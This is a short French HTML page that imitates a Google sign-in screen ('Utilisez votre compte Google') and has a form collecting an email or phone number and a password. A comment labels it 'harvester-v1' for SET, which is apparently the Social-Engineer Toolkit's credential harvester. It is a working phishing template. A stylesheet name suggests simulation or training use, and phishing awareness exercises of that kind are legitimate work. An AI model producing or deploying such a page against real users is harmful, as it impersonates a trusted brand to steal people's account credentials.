<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion</title>
  <link rel="stylesheet" href="login-simulation.css" />
  <!-- build: harvester-v1 — formulaire standard pour SET -->
</head>
<body>
  <main class="login-page" aria-labelledby="login-title">
    <section class="login-card login-card--harvester">
      <div class="brand-zone">
        <h1 id="login-title">Connexion</h1>
        <p>Utilisez votre compte Google</p>
      </div>

      <form class="form-zone harvester-form" method="POST" action="/">
        <div class="field-group">
          <label for="username">Adresse e-mail ou téléphone</label>
          <input
            id="username"
            name="username"
            type="text"
            autocomplete="username"
            required
          />
        </div>

        <div class="field-group">
          <label for="password">Mot de passe</label>
          <input
            id="password"
            name="password"
            type="password"
            autocomplete="current-password"
            required
          />
        </div>

        <a class="helper-link" href="#">Adresse e-mail oubliée ?</a>

        <div class="actions">
          <button type="submit">Suivant</button>
        </div>
      </form>
    </section>
  </main>
</body>
</html>
